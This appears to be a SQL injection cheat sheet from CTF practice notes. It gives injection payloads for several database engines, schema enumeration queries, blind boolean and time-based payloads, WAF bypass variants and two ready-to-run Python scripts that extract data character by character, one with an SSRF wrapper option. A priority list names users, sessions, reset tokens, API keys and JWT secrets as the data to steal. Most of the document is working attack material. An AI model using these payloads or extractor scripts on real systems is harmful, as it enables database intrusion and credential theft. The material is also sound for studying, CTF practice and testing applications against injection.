# SQL Injection

## Fast Payloads

```sql
' OR '1'='1'-- -
" OR "1"="1"-- -
') OR ('1'='1'-- -
' ORDER BY 1-- -
' UNION SELECT NULL,NULL,NULL-- -
' UNION SELECT 1,2,3-- -
```

## Engine Fingerprint

| DB | Hints |
| --- | --- |
| SQLite | `sqlite_master`, `substr`, `instr`, `group_concat`, `randomblob` |
| MySQL | `information_schema`, `sleep`, `benchmark`, `substring`, `database()` |
| PostgreSQL | `pg_catalog`, `version()`, `substring`, `pg_sleep` |
| MSSQL | `sys.tables`, `WAITFOR DELAY`, `TOP 1`, `SUBSTRING` |

## NoSQL?

{% embed url="https://hacktricks.boitatech.com.br/pentesting-web/nosql-injection" %}

## Recon

```sql

# testing payloads
'
"
`
')
")
`)
'))
"))
`))
​
# comments
MySQL
#comment
-- comment     [Note the space after the double dash]
/*comment*/
/*! MYSQL Special SQL */

PostgreSQL
--comment
/*comment*/

MSQL
--comment
/*comment*/

Oracle
--comment

SQLite
--comment
/*comment*/

HQL
HQL does not support comments# comments

```

<pre class="language-sql"><code class="lang-sql">
<strong># postgres, mysql
</strong>1. schema_name FROM information_schema.schemata - ambil database
2. table_name/GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='ZZZ' LIMIT 1 OFFSET 0 - ambil table
3. column_name FROM information_schema.columns WHERE table_name='ZZZ' - ambil column
​
## Special
FROM information_schema.processlist # ambil process yg dijalankan
​
# sqlite
0. select sqlite_version();
1. SELECT sql FROM sqlite_schema / sql FROM sqlite_master
2. SELECT tbl_name FROM sqlite_master WHERE type='table' / SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'
3. a. SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='table_name'
   b. SELECT GROUP_CONCAT(name) FROM pragma_table_info('table_name');

</code></pre>

## Union Extract

```sql
-- column count
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -

-- type alignment
' UNION SELECT NULL,NULL,NULL-- -
' UNION SELECT 'a',NULL,NULL-- -

-- sqlite
' UNION SELECT 1,group_concat(name),3 FROM sqlite_master-- -
' UNION SELECT 1,group_concat(sql),3 FROM sqlite_master WHERE type='table'-- -
' UNION SELECT 1,group_concat(flag),3 FROM flag-- -

-- mysql
' UNION SELECT 1,database(),3-- -
' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -
' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'-- -
```

## Non-SELECT Context

```sql
-- ORDER BY / sort param
ASC, (SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END)

-- LIMIT/OFFSET
1 OFFSET (SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END)

-- LIKE/search
%' UNION SELECT 1,2,3-- -
%' AND substr((SELECT flag FROM flag LIMIT 1),1,1)='C'-- -

-- numeric / IN list
1) OR 1=1-- -
1) UNION SELECT 1,2,3-- -
```

## Blind Patterns

```sql
-- boolean
' OR (SELECT CASE WHEN substr((SELECT flag FROM flag LIMIT 1),1,1)='C' THEN 1 ELSE 0 END)-- -
' OR EXISTS(SELECT 1 FROM users WHERE username='admin' AND substr(password,1,1)='a')-- -

-- mysql time
' OR IF(ASCII(SUBSTRING((SELECT flag FROM flag LIMIT 1),1,1))>77,SLEEP(2),0)-- -
' OR (SELECT BENCHMARK(5000000,MD5(1)))-- -

-- sqlite heavy query / error-ish
' OR CASE WHEN substr((SELECT flag FROM flag LIMIT 1),1,1)='C' THEN 1 ELSE randomblob(100000000) END-- -
' OR (SELECT COUNT(*) FROM sqlite_master a, sqlite_master b, sqlite_master c)-- -

-- postgres time
' OR CASE WHEN substring((SELECT flag FROM flag LIMIT 1),1,1)='C' THEN pg_sleep(2) END-- -

-- mssql time
';IF(ASCII(SUBSTRING((SELECT TOP 1 flag FROM secret),1,1))>77) WAITFOR DELAY '0:0:2'--
```

## WAF Bypass

```sql
'/**/UNION/**/SELECT/**/1,2,3-- -
' uNIoN sElEcT 1,2,3-- -
' un/**/ion sel/**/ect 1,2,3-- -
```

## Extract Priority

1. DB/user/version.
2. Table names and create statements.
3. Users, sessions, reset tokens, API keys, JWT secrets.
4. Source/config tables in CMS apps.
5. Flag table/content.

### Boolean / Error-Based Extractor

```python
import string
import requests
from urllib.parse import quote

URL = "http://HOST/search"
METHOD = "GET"  # GET / POST
PARAMS = {"q": "test"}
INJECT_PARAM = "q"

# Optional: wrap payload inside an SSRF URL fetcher.
USE_SSRF_WRAPPER = False
SSRF_PARAM = "url"
INNER_URL = "http://internal.:5001/search?q={payload}"

QUERY = "SELECT flag FROM secrets LIMIT 1"
START = ""
CHARSET = string.ascii_letters + string.digits + "{}_-"
TRUE_MARKER = "Found"
ERROR_MARKER = None  # e.g. "SQL error", "500 Internal", "content size: 14"
TIMEOUT = 8


def make_condition(prefix):
    # SQLite prefix check. Change to LIKE / SUBSTR / REGEXP depending on DB.
    return f"({QUERY}) GLOB '{prefix}*'"


def make_payload(condition):
    # Boolean-based: true branch returns rows, false branch returns none.
    return f"a' UNION SELECT flag FROM secrets WHERE {condition}-- -"

    # SQLite error/time-ish false branch:
    # return f"a' OR CASE WHEN {condition} THEN 1 ELSE randomblob(100000000) END-- -"

    # MySQL error-based:
    # return f"a' AND IF({condition},1,UPDATEXML(1,CONCAT(0x7e,(SELECT 1)),1))-- -"


def send(payload):
    data = PARAMS.copy()

    if USE_SSRF_WRAPPER:
        data = {SSRF_PARAM: INNER_URL.format(payload=quote(payload, safe=""))}
    else:
        data[INJECT_PARAM] = payload

    if METHOD == "POST":
        return requests.post(URL, data=data, timeout=TIMEOUT)
    return requests.get(URL, params=data, timeout=TIMEOUT)


def oracle(prefix):
    r = send(make_payload(make_condition(prefix)))

    if ERROR_MARKER is not None:
        return ERROR_MARKER not in r.text
    return TRUE_MARKER in r.text


flag = START

while not flag.endswith("}"):
    for c in CHARSET:
        if oracle(flag + c):
            flag += c
            print(flag)
            break
    else:
        raise SystemExit(f"stuck at {flag!r}")

print("Final:", flag)
```

### Time-Based Blind SQLi Threaded Extractor

```python
import requests
from tqdm import tqdm
from concurrent.futures import ThreadPoolExecutor, as_completed

URL = "http://HOST/path"
METHOD = "GET"  # GET / POST

# Base request. Put normal params/body here.
PARAMS = {
    "id": "1",
    "order": "ASC",
}

INJECT_PARAM = "order"
QUERY = "SELECT flag FROM flag LIMIT 1"
MAX_LEN = 64
THREADS = 4
SLEEP = 2.0
THRESHOLD = 1.5
TIMEOUT = 8
CHARSET_LOW = 32
CHARSET_HIGH = 126


def build_payload(pos, mid):
    # MySQL/MariaDB. pos is 1-based.
    cond = f"ASCII(SUBSTRING(({QUERY}),{pos},1))>{mid}"
    return f"ASC,IF(({cond}),SLEEP({SLEEP}),0)-- -"


def send(payload):
    data = PARAMS.copy()
    data[INJECT_PARAM] = payload

    if METHOD == "POST":
        return requests.post(URL, data=data, timeout=TIMEOUT)
    return requests.get(URL, params=data, timeout=TIMEOUT)


def is_true(pos, mid):
    try:
        r = send(build_payload(pos, mid))
        return r.elapsed.total_seconds() > THRESHOLD
    except requests.exceptions.Timeout:
        return True


def get_char(pos):
    lo, hi = CHARSET_LOW, CHARSET_HIGH
    while lo <= hi:
        mid = (lo + hi) // 2
        if is_true(pos, mid):
            lo = mid + 1
        else:
            hi = mid - 1
    return chr(lo)


def worker(pos):
    return pos, get_char(pos)


out = ["?"] * MAX_LEN

with ThreadPoolExecutor(max_workers=THREADS) as ex:
    futures = [ex.submit(worker, pos) for pos in range(1, MAX_LEN + 1)]

    for future in tqdm(as_completed(futures), total=len(futures)):
        pos, char = future.result()
        out[pos - 1] = char
        print("".join(out))

print("Final:", "".join(out).rstrip("?"))
```
